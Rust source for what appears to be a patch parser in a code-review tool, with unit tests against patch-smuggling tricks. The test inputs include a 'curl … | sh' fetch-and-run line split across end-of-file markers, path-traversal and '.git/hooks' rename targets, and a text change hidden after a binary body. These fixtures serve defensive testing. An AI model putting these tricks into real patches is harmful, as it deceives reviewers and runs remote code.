    let start = number(nums.next()?)?;
    let count = match nums.next() {
        Some(c) => number(c)?,
        None => 1,
    };
    if nums.next().is_some() {
        return None;
    }
    Some((start, count))
}

/// A header path as `git apply` (default `-p1`) writes it: its first component stripped,
/// whatever it is (`a/` and `b/`, but also the `i/`, `w/`, `c/` and `o/` of
/// `diff.mnemonicPrefix`, a custom `--src-prefix`, or the first directory of a plain
/// `diff -u old/x new/x`), and repeated slashes squashed as `find_name` squashes them, so
/// `a/.github//workflows/ci.yml` is `.github/workflows/ci.yml`. Only a literal `a/` or `b/` was
/// stripped and slashes were kept, so `--- vendor/build.rs` was reviewed as vendored code while
/// Git wrote the top-level `build.rs`, and a doubled slash lost a CI workflow's signals (bug hunt
/// 2026-11-01). A path with no `/` is kept whole, and under a guessed `-p0` every path is.
fn p_name(path: &str, p0: bool) -> String {
    let stripped = if p0 {
        path
    } else {
        path.split_once('/').map_or(path, |(_, rest)| rest)
    };
    squash_slashes(stripped)
}

/// `find_name_common`'s strip: the path after its first component (all of it under `-p0`), or
/// `None` when that leaves nothing, where Git falls back to the other side's name.
fn strip_p(path: &str, p0: bool) -> Option<&str> {
    let rest = if p0 { path } else { path.split_once('/')?.1 };
    (!rest.is_empty()).then_some(rest)
}

/// `squash_slash`: each run of `/` becomes one.
fn squash_slashes(path: &str) -> String {
    let mut out = String::with_capacity(path.len());
    for c in path.chars() {
        if !(c == '/' && out.ends_with('/')) {
            out.push(c);
        }
    }
    out
}

/// `skip_tree_prefix`: the name after its first component (`p0`: all of it), `None` when there
/// is no `/` to strip at, or it is the first byte.
fn skip_tree_prefix(name: &str, p0: bool) -> Option<&str> {
    if p0 {
        return (!name.starts_with('/')).then_some(name);
    }
    match name.find('/') {
        Some(0) | None => None,
        Some(at) => Some(&name[at + 1..]),
    }
}

/// The name in an unquoted `diff --git X/NAME Y/NAME` line, found as `git_header_name` finds
/// it: the split at a space or tab where both halves name the same path once their first
/// components are stripped, or, when the second half is quoted, where it decodes to the
/// first. `None` when no split does (the names differ, or the line ends in a CR the first name
/// lacks).
fn same_name_halves(rest: &str, p0: bool) -> Option<String> {
    let name = skip_tree_prefix(rest, p0)?;
    // The first name is unquoted, so a quote can only open the second.
    if let Some(quote) = name.find('"') {
        let (second, _) = super::paths::decode_quoted_prefix(&name[quote..])?;
        let second = skip_tree_prefix(&second, p0)?;
        // The first name, before the quote, is the second and then whitespace.
        return name[..quote]
            .strip_prefix(second)
            .is_some_and(|after| after.starts_with([' ', '\t', '\r']))
            .then(|| second.to_owned());
    }
    // Linear, unlike a fresh `skip_tree_prefix` per separator (a line of spaces was quadratic):
    // the first `/` after a separator only moves right, and as the second half's length only
    // shrinks while the first's grows, at most one split has halves of equal length.
    let bytes = name.as_bytes();
    let mut slash = 0;
    for (at, _) in name.match_indices([' ', '\t']) {
        let start = at + 1;
        if start == bytes.len() {
            return None;
        }
        let second = if p0 {
            if bytes[start] == b'/' {
                return None;
            }
            start
        } else {
            // The first `/` at or after `start`, scanned on from the last one found, so each
            // byte is scanned once (a `slash < start` guard here had an equivalent `<=` mutant).
            slash = slash.max(start);
            slash += bytes[slash..].iter().position(|&b| b == b'/')?;
            if slash == start {
                return None;
            }
            slash + 1
        };
        if bytes.len() - second == at && name[second..] == name[..at] {
            return Some(name[..at].to_owned());
        }
    }
    None
}

/// The name a `---`/`+++` header value gives, as `find_name` reads it: `/dev/null` when it
/// starts with `/dev/null` and whitespace, a quoted name decoded, or an unquoted name up to its
/// first tab or carriage return, which end it in Git (a CR inside an unquoted name is not part
/// of the path Git writes). When `dated` (a traditional diff's line with no CR end), a trailing
/// `diff -u` timestamp after a tab or spaces ends it instead (`find_name_traditional`), so
/// `--- a/build.rs 2026-01-01 12:00:00` names `a/build.rs`.
fn header_name(rest: &str, dated: bool) -> Option<String> {
    if rest
        .strip_prefix("/dev/null")
        .is_some_and(|after| after.is_empty() || after.starts_with([' ', '\t', '\r']))
    {
        return Some("/dev/null".to_owned());
    }
    if rest.starts_with('"') {
        return super::paths::decode_path(rest.split('\t').next().unwrap_or(rest));
    }
    let stamp = if dated {
        timestamp_len(rest.as_bytes())
    } else {
        0
    };
    let name = if stamp > 0 {
        rest.get(..rest.len() - stamp)?
    } else {
        rest.split(['\t', '\r']).next().unwrap_or(rest)
    };
    super::paths::decode_path(name)
}

/// `diff_timestamp_len`: the length of the `diff -u` timestamp ending `line`, with the tab or
/// the spaces before it (`2026-01-01 12:00:00[.frac][ +0000]`), or 0 when there is none.
fn timestamp_len(line: &[u8]) -> usize {
    let digits = |s: &[u8]| s.iter().all(u8::is_ascii_digit);
    // ` +0500`
    let sane_tz = |s: &[u8]| {
        let Some(tz) = s.len().checked_sub(6) else {
            return 0;
        };
        if s[tz] == b' ' && matches!(s[tz + 1], b'+' | b'-') && digits(&s[tz + 2..]) {
            6
        } else {
            0
        }
    };
    // ` +08:00`
    let colon_tz = |s: &[u8]| {
        let Some(tz) = s.len().checked_sub(7) else {
            return 0;
        };
        if s[tz] == b' '
            && matches!(s[tz + 1], b'+' | b'-')
            && digits(&s[tz + 2..tz + 4])
            && s[tz + 4] == b':'
            && digits(&s[tz + 5..])
        {
            7
        } else {
            0
        }
    };
    // ` 07:01:32`
    let short_time = |s: &[u8]| {
        let Some(at) = s.len().checked_sub(9) else {
            return 0;
        };
        let t = &s[at..];
        if t[0] == b' '
            && digits(&t[1..3])
            && t[3] == b':'
            && digits(&t[4..6])
            && t[6] == b':'
            && digits(&t[7..])
        {
            9
        } else {
            0
        }
    };
    // ` 19:41:17.620000023`
    let fractional_time = |s: &[u8]| {
        let whole = s.len() - s.iter().rev().take_while(|b| b.is_ascii_digit()).count();
        if whole == s.len() || whole == 0 || s[whole - 1] != b'.' {
            return 0;
        }
        match short_time(&s[..whole - 1]) {
            0 => 0,
            n => s.len() - (whole - 1) + n,
        }
    };
    // `72-02-05` or `1972-02-05`
    let date = |s: &[u8]| {
        let Some(at) = s.len().checked_sub(8) else {
            return 0;
        };
        let d = &s[at..];
        if !(digits(&d[..2]) && d[2] == b'-' && digits(&d[3..5]) && d[5] == b'-' && digits(&d[6..]))
        {
            return 0;
        }
        if at >= 2 && digits(&s[at - 2..at]) {
            10
        } else {
            8
        }
    };
    if !line.last().is_some_and(u8::is_ascii_digit) {
        return 0;
    }
    let mut end = line.len();
    end -= match sane_tz(line) {
        0 => colon_tz(line),
        n => n,
    };
    end -= match short_time(&line[..end]) {
        0 => fractional_time(&line[..end]),
        n => n,
    };
    match date(&line[..end]) {
        0 => return 0,
        n => end -= n,
    }
    match end.checked_sub(1).map(|at| line[at]) {
        Some(b'\t') => line.len() - (end - 1),
        // Whitespace damage: spaces before the date.
        Some(b' ') => {
            line.len() - (end - line[..end].iter().rev().take_while(|&&b| b == b' ').count())
        }
        _ => 0,
    }
}

/// `has_epoch_timestamp`: the text after the header's last tab is the Unix epoch in some time
/// zone (`1970-01-01 00:00:00 +0000`, `1969-12-31 19:00:00 -0500`), which `diff -N` writes for
/// the side of a file that does not exist.
fn has_epoch_timestamp(rest: &str) -> bool {
    let Some((_, stamp)) = rest.rsplit_once('\t') else {
        return false;
    };
    let (epoch_hour, time) = if let Some(time) = stamp.strip_prefix("1969-12-31 ") {
        (24, time)
    } else if let Some(time) = stamp.strip_prefix("1970-01-01 ") {
        (0, time)
    } else {
        return false;
    };
    // `[0-2][0-9]:[0-5][0-9]:00(\.0+)? [-+][0-2][0-9]:?[0-5][0-9]` and the end of the line.
    let two = |s: &[u8], first: u8| -> Option<i32> {
        match s {
            [a @ b'0'..=b'9', b @ b'0'..=b'9'] if *a <= first => {
                Some(i32::from(a - b'0') * 10 + i32::from(b - b'0'))
            }
            _ => None,
        }
    };
    let t = time.as_bytes();
    let (Some(hour), Some(minute), Some(b":00")) = (
        t.get(..2).and_then(|s| two(s, b'2')),
        t.get(3..5).and_then(|s| two(s, b'5')),
        t.get(5..8),
    ) else {
        return false;
    };
    if t[2] != b':' {
        return false;
    }
    let mut rest = &t[8..];
    if let Some(fraction) = rest.strip_prefix(b".") {
        let zeros = fraction.iter().take_while(|&&b| b == b'0').count();
        if zeros == 0 {
            return false;
        }
        rest = &fraction[zeros..];
    }
    let [b' ', sign @ (b'+' | b'-'), zone @ ..] = rest else {
        return false;
    };
    let zone = match zone {
        [h0, h1, b':', m0, m1] | [h0, h1, m0, m1] => {
            match (two(&[*h0, *h1], b'2'), two(&[*m0, *m1], b'5')) {
                (Some(h), Some(m)) => h * 60 + m,
                _ => return false,
            }
        }
        _ => return false,
    };
    let zone = if *sign == b'-' { -zone } else { zone };
    hour * 60 + minute - zone == epoch_hour * 60
}

/// Git's base85 alphabet (`base85.c`).
const BASE85: &[u8; 85] =
    b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~";

/// One line of a `GIT binary patch` body, as `git apply` reads it: a `literal N` or `delta N`
/// header, the empty line that ends a hunk, or a data line whose first letter encodes its byte
/// count (`A`-`Z` 1-26, `a`-`z` 27-52) followed by exactly that many bytes in base85.
fn is_binary_body_line(line: &str) -> bool {
    if line.is_empty() {
        return true;
    }
    if let Some(size) = line
        .strip_prefix("literal ")
        .or_else(|| line.strip_prefix("delta "))
    {
        return !size.is_empty() && size.bytes().all(|b| b.is_ascii_digit());
    }
    let bytes = line.as_bytes();
    let count = match bytes[0] {
        b @ b'A'..=b'Z' => usize::from(b - b'A') + 1,
        b @ b'a'..=b'z' => usize::from(b - b'a') + 27,
        _ => return false,
    };
    let data = &bytes[1..];
    data.len() == count.div_ceil(4) * 5 && data.iter().all(|b| BASE85.contains(b))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn one(input: &str) -> ReviewFile {
        let files = parse(input).expect("parse should succeed");
        assert_eq!(files.len(), 1, "expected exactly one file");
        files.into_iter().next().unwrap()
    }

    // --- patch-truth: hunks must satisfy their declared `@@ -a,b +c,d @@` counts.

    #[test]
    fn exact_hunk_counts_are_accepted() {
        // old = 1 ctx + 1 removed = 2; new = 1 ctx + 1 added = 2.
        let input = "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n ctx\n-old\n+new\n";
        let file = one(input);
        assert_eq!(file.patch_twin.hunks[0].lines.len(), 3);
    }

    #[test]
    fn truncated_hunk_at_eof_is_rejected() {
        // Header declares 5 old / 5 new but provides 2 lines, then EOF.
        let input = "--- a/x\n+++ b/x\n@@ -1,5 +1,5 @@\n ctx\n-old\n";
        let err = parse(input).unwrap_err();
        assert!(
            matches!(err, PatchParseError::TruncatedHunk { remaining_old, remaining_new, .. } if remaining_old == 3 && remaining_new == 4),
            "expected TruncatedHunk, got {err:?}"
        );
    }

    #[test]
    fn truncated_hunk_before_next_file_is_rejected() {
        // First hunk is truncated, then a second file header arrives.
        let input = "\
diff --git a/x b/x
--- a/x
+++ b/x
@@ -1,3 +1,3 @@
 ctx
diff --git a/y b/y
--- a/y
+++ b/y
@@ -1,1 +1,1 @@
-a
+b
";
        let err = parse(input).unwrap_err();
        assert!(
            matches!(err, PatchParseError::TruncatedHunk { .. }),
            "got {err:?}"
        );
    }

    #[test]
    fn added_line_when_new_count_is_zero_is_rejected() {
        // A pure-deletion hunk (`+0,0`) that supplies an addition over-fills the
        // new side while the old side is still expected.
        let input = "--- a/x\n+++ b/x\n@@ -1,1 +0,0 @@\n+oops\n";
        let err = parse(input).unwrap_err();
        assert!(
            matches!(err, PatchParseError::HunkLineCountMismatch { .. }),
            "got {err:?}"
        );
    }

    #[test]
    fn removed_line_when_old_count_is_zero_is_rejected() {
        // A pure-addition hunk (`-0,0`) that supplies a removal over-fills old.
        let input = "--- a/x\n+++ b/x\n@@ -0,0 +1,1 @@\n-oops\n";
        let err = parse(input).unwrap_err();
        assert!(
            matches!(err, PatchParseError::HunkLineCountMismatch { .. }),
            "got {err:?}"
        );
    }

    #[test]
    fn context_line_when_one_side_exhausted_is_rejected() {
        // old = 1, new = 2: the first context consumes the only old slot; a
        // second context has no old slot left.
        let input = "--- a/x\n+++ b/x\n@@ -1,1 +1,2 @@\n ctx\n ctx2\n";
        let err = parse(input).unwrap_err();
        assert!(
            matches!(err, PatchParseError::HunkLineCountMismatch { .. }),
            "got {err:?}"
        );
    }

    #[test]
    fn trailing_body_line_after_a_satisfied_hunk_is_rejected() {
        // The hunk's counts are exactly met by `-old`/`+new`; the extra `+x`
        // then falls outside any hunk and is rejected (BodyLineOutsideHunk).
        let input = "--- a/x\n+++ b/x\n@@ -1,1 +1,1 @@\n-old\n+new\n+x\n";
        let err = parse(input).unwrap_err();
        assert!(
            matches!(err, PatchParseError::BodyLineOutsideHunk { .. }),
            "got {err:?}"
        );
    }

    #[test]
    fn truncated_hunk_error_displays_remaining() {
        let input = "--- a/x\n+++ b/x\n@@ -1,4 +1,4 @@\n ctx\n";
        let msg = parse(input).unwrap_err().to_string();
        assert!(msg.contains("truncated hunk"));
    }

    const BASIC: &str = "\
diff --git a/src/lib.rs b/src/lib.rs
index 1111111..2222222 100644
--- a/src/lib.rs
+++ b/src/lib.rs
@@ -1,3 +1,3 @@
 fn main() {
-    let x = 1;
+    let x = 2;
 }
";

    #[test]
    fn parses_single_modified_file() {
        let file = one(BASIC);
        assert_eq!(file.path, "src/lib.rs");
        assert_eq!(file.status, FileStatus::Modified);
    }

    #[test]
    fn modified_file_has_one_hunk() {
        let file = one(BASIC);
        assert_eq!(file.patch_twin.hunks.len(), 1);
    }

    #[test]
    fn hunk_records_start_lines() {
        let file = one(BASIC);
        let hunk = &file.patch_twin.hunks[0];
        assert_eq!(hunk.old_start, Some(1));
        assert_eq!(hunk.new_start, Some(1));
    }

    #[test]
    fn hunk_line_kinds_are_in_order() {
        let file = one(BASIC);
        let kinds: Vec<_> = file.patch_twin.hunks[0]
            .lines
            .iter()
            .map(|l| l.kind)
            .collect();
        assert_eq!(
            kinds,
            vec![
                PatchLineKind::Context,
                PatchLineKind::Removed,
                PatchLineKind::Added,
                PatchLineKind::Context,
            ]
        );
    }

    #[test]
    fn added_line_has_only_new_line_number() {
        let file = one(BASIC);
        let added = file.patch_twin.hunks[0]
            .lines
            .iter()
            .find(|l| l.kind == PatchLineKind::Added)
            .unwrap();
        assert_eq!(added.old_line, None);
        assert_eq!(added.new_line, Some(2));
    }

    #[test]
    fn removed_line_has_only_old_line_number() {
        let file = one(BASIC);
        let removed = file.patch_twin.hunks[0]
            .lines
            .iter()
            .find(|l| l.kind == PatchLineKind::Removed)
            .unwrap();
        assert_eq!(removed.old_line, Some(2));
        assert_eq!(removed.new_line, None);
    }

    #[test]
    fn context_line_advances_both_sides() {
        let file = one(BASIC);
        let first = &file.patch_twin.hunks[0].lines[0];
        assert_eq!(first.kind, PatchLineKind::Context);
        assert_eq!(first.old_line, Some(1));
        assert_eq!(first.new_line, Some(1));
    }

    #[test]
    fn line_text_strips_leading_marker() {
        let file = one(BASIC);
        let added = file.patch_twin.hunks[0]
            .lines
            .iter()
            .find(|l| l.kind == PatchLineKind::Added)
            .unwrap();
        assert_eq!(added.text, "    let x = 2;");
    }

    #[test]
    fn captures_index_metadata() {
        let file = one(BASIC);
        assert!(
            file.patch_twin
                .metadata
                .iter()
                .any(|m| m.starts_with("index "))
        );
    }

    #[test]
    fn empty_input_yields_no_files() {
        assert_eq!(parse("").unwrap().len(), 0);
    }

    #[test]
    fn whitespace_only_input_yields_no_files() {
        assert_eq!(parse("\n\n   \n").unwrap().len(), 0);
    }

    #[test]
    fn new_file_is_added() {
        let input = "\
diff --git a/new.txt b/new.txt
new file mode 100644
index 0000000..abcdef0
--- /dev/null
+++ b/new.txt
@@ -0,0 +1,2 @@
+hello
+world
";
        let file = one(input);
        assert_eq!(file.status, FileStatus::Added);
        assert_eq!(file.path, "new.txt");
    }

    #[test]
    fn new_file_records_added_lines() {
        let input = "\
diff --git a/new.txt b/new.txt
new file mode 100644
--- /dev/null
+++ b/new.txt
@@ -0,0 +1,2 @@
+hello
+world
";
        let file = one(input);
        let adds = file.patch_twin.hunks[0]
            .lines
            .iter()
            .filter(|l| l.kind == PatchLineKind::Added)
            .count();
        assert_eq!(adds, 2);
    }

    #[test]
    fn deleted_file_is_deleted() {
        let input = "\
diff --git a/old.txt b/old.txt
deleted file mode 100644
--- a/old.txt
+++ /dev/null
@@ -1,2 +0,0 @@
-hello
-world
";
        let file = one(input);
        assert_eq!(file.status, FileStatus::Deleted);
        assert_eq!(file.path, "old.txt");
    }

    #[test]
    fn rename_is_renamed_and_uses_new_path() {
        let input = "\
diff --git a/old/name.rs b/new/name.rs
similarity index 100%
rename from old/name.rs
rename to new/name.rs
";
        let file = one(input);
        assert_eq!(file.status, FileStatus::Renamed);
        assert_eq!(file.path, "new/name.rs");
    }

    /// A text change after a binary body is never folded into it: before, every later line went
    /// into the body, so DDF reviewed only the binary file while `git apply` also changed
    /// `evil.rs`. That patch is now refused at the first line outside the body grammar.
    #[test]
    fn a_text_change_after_a_binary_body_is_never_hidden_in_it() {
        let input = "\
diff --git a/img.bin b/img.bin
index 88768efdf77ec78c9a995f94881793be6a41752b..f68ed8037341be54a4bad1485a8deb1be7188467 100644
GIT binary patch
literal 6
NcmZQzO3KVL0ssTy0d4>Q

literal 5
McmZQzOv=my00M6TI{*Lx

--- a/evil.rs
+++ b/evil.rs
@@ -1 +1 @@
-x
+y
";
        assert!(matches!(
            parse(input),
            Err(PatchParseError::UnsupportedFormat { line_number: 10 })
        ));
        // Legitimate nearby case: the same binary section followed by a `diff --git` text file.
        let split = input.replace("--- a/evil.rs", "diff --git a/ok.rs b/ok.rs\n--- a/ok.rs");
        let split = split.replace("+++ b/evil.rs", "+++ b/ok.rs");
        let files = parse(&split).unwrap();
        assert_eq!(files.len(), 2);
        assert_eq!(files[0].patch_twin.binary_body.len(), 6);
        assert_eq!(files[1].patch_twin.hunks.len(), 1);
    }

    /// The body grammar `git apply` reads, and the lines it does not.
    #[test]
    fn the_binary_body_grammar_is_git_s() {
        for line in [
            "",
            "literal 6",
            "delta 12",
            "NcmZQzO3KVL0ssTy0d4>Q",
            "McmZQzOv=my00M6TI{*Lx",
            "zcmV?d00001zcmV?d00001zcmV?d00001zcmV?d00001zcmV?d00001zcmV?d00001",
        ] {
            assert!(is_binary_body_line(line), "{line:?} is body");
        }
        for line in [
            "--- a/evil.rs",
            "+++ b/evil.rs",
            "@@ -1 +1 @@",
            "+y",
            "-x",
            " context",
            "index 0",
            "literal ",
            "literal 6x",
            "delta",
            "NcmZQzO3KVL0ssTy0d4>",
            "NcmZQzO3KVL0ssTy0d4>QQ",
            "NcmZQzO3KVL0ssTy0d4 Q",
            "1cmZQzO3KVL0ssTy0d4>Q",
        ] {
            assert!(!is_binary_body_line(line), "{line:?} is not body");
        }
    }

    #[test]
    fn binary_file_is_binary_changed() {
        let input = "\
diff --git a/logo.png b/logo.png
index 1111111..2222222 100644
Binary files a/logo.png and b/logo.png differ
";
        let file = one(input);
        assert_eq!(file.status, FileStatus::BinaryChanged);
        assert_eq!(file.path, "logo.png");
    }

    #[test]
    fn binary_file_uses_line_strategy_exception() {
        let input = "\
diff --git a/logo.png b/logo.png
Binary files a/logo.png and b/logo.png differ
";
        let file = one(input);
        assert_eq!(file.planner.strategy, DiffStrategy::Binary);
    }

    #[test]
    fn pure_mode_change_is_mode_changed() {
        let input = "\
diff --git a/run.sh b/run.sh
old mode 100644
new mode 100755
";
        let file = one(input);
        assert_eq!(file.status, FileStatus::ModeChanged);
    }

    /// Bug hunt 2026-10-28, H4-07: only a change of object type (a file, a symlink, a
    /// submodule) is `type_changed`; flipping the executable bit was labelled one too.
    #[test]
    fn a_mode_header_that_changes_the_object_type_is_type_changed() {
        for (old, new) in [
            ("100644", "120000"),
            ("120000", "100755"),
            ("160000", "100644"),
        ] {
            let input = format!("diff --git a/l b/l\nold mode {old}\nnew mode {new}\n");
            assert_eq!(
                one(&input).status,
                FileStatus::TypeChanged,
                "{old} -> {new}"
            );
        }
        for (old, new) in [("100755", "100644"), ("100644", "100664")] {
            let input = format!("diff --git a/l b/l\nold mode {old}\nnew mode {new}\n");
            assert_eq!(
                one(&input).status,
                FileStatus::ModeChanged,
                "{old} -> {new}"
            );
        }
        // Half a mode pair cannot show the type was kept.
        assert_eq!(
            one("diff --git a/l b/l\nnew mode 100755\n").status,
            FileStatus::TypeChanged
        );
        // A mode change beside content stays a modification.
        let input = "diff --git a/l b/l\nold mode 100644\nnew mode 100755\n--- a/l\n+++ b/l\n@@ -1 +1 @@\n-a\n+b\n";
        assert_eq!(one(input).status, FileStatus::Modified);
    }

    /// `git apply` refuses a mode that is not octal ("invalid mode"); DDF took any text.
    #[test]
    fn a_mode_that_is_not_octal_is_refused() {
        for header in ["old mode", "new mode", "new file mode", "deleted file mode"] {
            // "1006444" is seven octal digits and "+10064" a sign `from_str_radix` would take.
            for bad in [
                "", "10064x", "1006448", "1006444", "+10064", "-100644", "100644 ", "\u{663}",
            ] {
                let input = format!("diff --git a/l b/l\n{header} {bad}\n");
                assert_eq!(
                    parse(&input),
                    Err(PatchParseError::InvalidMode { line_number: 2 }),
                    "{header} {bad:?}"
                );
            }
        }
        assert_eq!(parse_mode("0"), Some(0));
        assert_eq!(parse_mode("777777"), Some(0o777_777));
        assert_eq!(object_type(0o120_755), 0o120_000);
    }

    /// Bug hunt 2026-10-28, H1-09: a copy is `copied`, not `modified`, and keeps its new path.
    #[test]
    fn a_copy_is_copied() {
        let input = "\
diff --git a/x b/y
similarity index 100%
copy from x
copy to y
";
        let file = one(input);
        assert_eq!(file.status, FileStatus::Copied);
        assert_eq!(file.path, "y");
        let edited = "diff --git a/x b/y\nsimilarity index 90%\ncopy from x\ncopy to y\n--- a/x\n+++ b/y\n@@ -1 +1 @@\n-a\n+b\n";
        assert_eq!(one(edited).status, FileStatus::Copied);
        // Either copy header alone marks the copy.
        for half in ["copy from x", "copy to y"] {
            let input = format!("diff --git a/x b/y\n{half}\n");
            assert_eq!(one(&input).status, FileStatus::Copied, "{half}");
        }
    }

    /// Bug hunt 2026-10-28, H1-09: Git refuses a rename or copy that writes outside the tree or
    /// into `.git` ("invalid path"); DDF showed it with a `path_traversal` hazard.
    #[test]
    fn a_rename_or_copy_git_refuses_is_refused() {
        for bad in [
            "../evil",
            "/etc/evil",
            "a/../b",
            "a/./b",
            ".",
            ".git/hooks/x",
            "a/.GIT/x",
            "",
        ] {
            for (from, to) in [("x", bad), (bad, "y")] {
                for verb in ["rename", "copy"] {
                    let input = format!("diff --git a/x b/y\n{verb} from {from}\n{verb} to {to}\n");
                    let line_number = if from == bad { 2 } else { 3 };
                    assert_eq!(
                        parse(&input),
                        Err(PatchParseError::InvalidPath { line_number }),
                        "{verb} {from} -> {to}"
                    );
                }
            }
        }
        assert!(git_refuses_path(".Git"));
        for fine in ["a..b/c", "a/.gitignore", ".github/x", "a//b", "x.git/y"] {
            assert!(!git_refuses_path(fine), "{fine}");
        }
    }

    #[test]
    fn plain_unified_diff_without_git_header() {
        let input = "\
--- a/file.txt
+++ b/file.txt
@@ -1,1 +1,1 @@
-old
+new
";
        let file = one(input);
        assert_eq!(file.path, "file.txt");
        assert_eq!(file.status, FileStatus::Modified);
    }

    #[test]
    fn two_files_parse_independently() {
        let input = "\
diff --git a/a.txt b/a.txt
--- a/a.txt
+++ b/a.txt
@@ -1,1 +1,1 @@
-a
+A
diff --git a/b.txt b/b.txt
--- a/b.txt
+++ b/b.txt
@@ -1,1 +1,1 @@
-b
+B
";
        let files = parse(input).unwrap();
        assert_eq!(files.len(), 2);
        assert_eq!(files[0].path, "a.txt");
        assert_eq!(files[1].path, "b.txt");
    }

    #[test]
    fn consecutive_plain_diffs_split_on_old_header() {
        let input = "\
--- a/a.txt
+++ b/a.txt
@@ -1,1 +1,1 @@
-a
+A
--- a/b.txt
+++ b/b.txt
@@ -1,1 +1,1 @@
-b
+B
";
        let files = parse(input).unwrap();
        assert_eq!(files.len(), 2);
    }

    #[test]
    fn removed_line_content_dashes_are_not_a_new_file() {
        // A removed line whose content begins with "-- " must not be mistaken
        // for the next file's "--- " header. Hunk counts disambiguate: while the
        // hunk still expects an old-side line, the "-"-prefixed line is removed
        // content. (Counts here are exact: old = 1 ctx + 2 removed = 3, new = 1.)
        let input = "\
diff --git a/x b/x
--- a/x
+++ b/x
@@ -1,3 +1,1 @@
 keep
-removed
--- not a header, just content
";
        let file = one(input);
        assert_eq!(file.patch_twin.hunks.len(), 1);
        let removed: Vec<_> = file.patch_twin.hunks[0]
            .lines
            .iter()
            .filter(|l| l.kind == PatchLineKind::Removed)
            .collect();
        assert_eq!(removed.len(), 2);
    }

    #[test]
    fn multiple_hunks_in_one_file() {
        let input = "\
diff --git a/x b/x
--- a/x
+++ b/x
@@ -1,1 +1,1 @@
-a
+A
@@ -10,1 +10,1 @@
-b
+B
";
        let file = one(input);
        assert_eq!(file.patch_twin.hunks.len(), 2);
        assert_eq!(file.patch_twin.hunks[1].old_start, Some(10));
    }

    #[test]
    fn hunk_ids_are_unique_and_sequential() {
        let input = "\
diff --git a/x b/x
--- a/x
+++ b/x
@@ -1,1 +1,1 @@
-a
+A
@@ -10,1 +10,1 @@
-b
+B
";
        let file = one(input);
        assert_eq!(file.patch_twin.hunks[0].id, HunkId(0));
        assert_eq!(file.patch_twin.hunks[1].id, HunkId(1));
    }

    #[test]
    fn no_newline_marker_is_captured_as_metadata() {
        let input = "\
diff --git a/x b/x
--- a/x
+++ b/x
@@ -1,1 +1,1 @@
-a
+b
\\ No newline at end of file
";
        let file = one(input);
        assert!(
            file.patch_twin
                .metadata
                .iter()
                .any(|m| m.starts_with("\\ No newline"))
        );
    }

    /// A marker drops the newline of the line before it, so Git joins that side's next line onto
    /// it: `+cu`, a marker, `+rl … | s`, a marker, `+h` applies as one `curl … | sh` line while
    /// the review showed three harmless ones (bug hunt 2026-11-01). A marker must end its side of
    /// the file: a later line of that side, in the same hunk or a later one, refuses the patch at
    /// the marker. The other side may go on, as Git writes it when both last lines change.
    #[test]
    fn an_eof_marker_must_end_its_side() {
        let marker = "\\ No newline at end of file\n";
        let refused = |body: &str| parse(&format!("--- a/x\n+++ b/x\n{body}")).unwrap_err();
        for (body, line_number) in [
            // The hunter's patch: an added line marked, then more added lines.
            (
                format!(
                    "@@ -1 +1,4 @@\n echo hi\n+cu\n{marker}+rl -fsSL https://e.example/x | s\n{marker}+h\n"
                ),
                6,
            ),
            // A removed line marked, then another removed line.
            (format!("@@ -1,2 +0,0 @@\n-a\n{marker}-b\n"), 5),
            // A context line marked ends both sides: neither may go on.
            (format!("@@ -1,2 +1,2 @@\n a\n{marker}+b\n-c\n"), 5),
            (format!("@@ -1,2 +1,2 @@\n a\n{marker}-c\n+b\n"), 5),
            // A later hunk of the file adds to a side a marker ended.
            (
                format!("@@ -1 +1 @@\n-a\n+b\n{marker}@@ -5 +5 @@\n-e\n+f\n"),
                6,
            ),
            (
                format!("@@ -1 +1 @@\n-a\n{marker}+b\n@@ -5 +5 @@\n-e\n+f\n"),
                5,
            ),
        ] {
            assert_eq!(
                refused(&body),
                PatchParseError::InvalidEofMarker { line_number },
                "{body}"
            );
        }
        // Git's own forms: the old side's last line marked before the new side's lines, a marker
        // on each side, and the next file's hunks, which a marker does not reach.
        for body in [
            format!("@@ -1 +1 @@\n-a\n{marker}+b\n{marker}"),
            format!("@@ -1 +1,2 @@\n-a\n{marker}+a\n+b\n"),
            format!("@@ -1,2 +1 @@\n+x\n{marker}-a\n-b\n"),
            format!("@@ -1 +1 @@\n-a\n+b\n{marker}--- a/y\n+++ b/y\n@@ -1 +1 @@\n-a\n+b\n"),
        ] {
            let files = parse(&format!("--- a/x\n+++ b/x\n{body}")).unwrap();
            assert!(
                files[0].patch_twin.hunks[0]
                    .lines
                    .iter()
                    .any(|l| l.no_newline),
                "{body}"
            );
        }
    }

    #[test]
    fn malformed_hunk_header_is_an_error() {
        let input = "\
diff --git a/x b/x
--- a/x
+++ b/x
@@ this is not a hunk header @@
-a
+b
";
        let err = parse(input).unwrap_err();
        assert!(matches!(err, PatchParseError::MalformedHunkHeader { .. }));
    }

    #[test]
    fn malformed_header_reports_line_number() {
        let input = "diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ bad @@\n";
        match parse(input).unwrap_err() {
            PatchParseError::MalformedHunkHeader { line_number, .. } => {
                assert_eq!(line_number, 4);
            }
            other => panic!("unexpected error: {other:?}"),
        }
    }

    #[test]
    fn body_line_outside_hunk_is_an_error() {
        let input = "\
diff --git a/x b/x
--- a/x
+++ b/x
+stray addition with no hunk
";
        let err = parse(input).unwrap_err();
        assert!(matches!(err, PatchParseError::BodyLineOutsideHunk { .. }));
    }

    /// An error quotes at most `ERROR_EXCERPT_BYTES` of the offending line, escaped, and counts
    /// the rest. Before, a 2 MB line became a 2,000,074-byte message in an agent's context.
    #[test]
    fn an_error_quotes_a_bounded_excerpt_of_the_offending_line() {
        let long = format!(
            "diff --git a/x b/x\n--- a/x\n+++ b/x\n+{}\n",
            "é".repeat(1_000_000)
        );
        let message = parse(&long).unwrap_err().to_string();
        assert!(message.len() < 250, "{} bytes", message.len());
        assert!(message.ends_with(" bytes)"), "{message}");
        assert!(
            message.contains(&format!("(+{} bytes)", 2_000_001 - 119)),
            "{message}"
        );
        let short = parse("diff --git a/x b/x\n--- a/x\n+++ b/x\n+stray \u{1b}[2J\n")
            .unwrap_err()
            .to_string();
        assert!(short.ends_with(r#": "+stray \u{1b}[2J""#), "{short}");
        let header = parse(&format!("--- a/x\n+++ b/x\n@@ {}\n", "x".repeat(500)))
            .unwrap_err()
            .to_string();
        assert!(header.contains("(+383 bytes)"), "{header}");
    }

    /// A hunk's address names it within one review; its body digest follows the change.
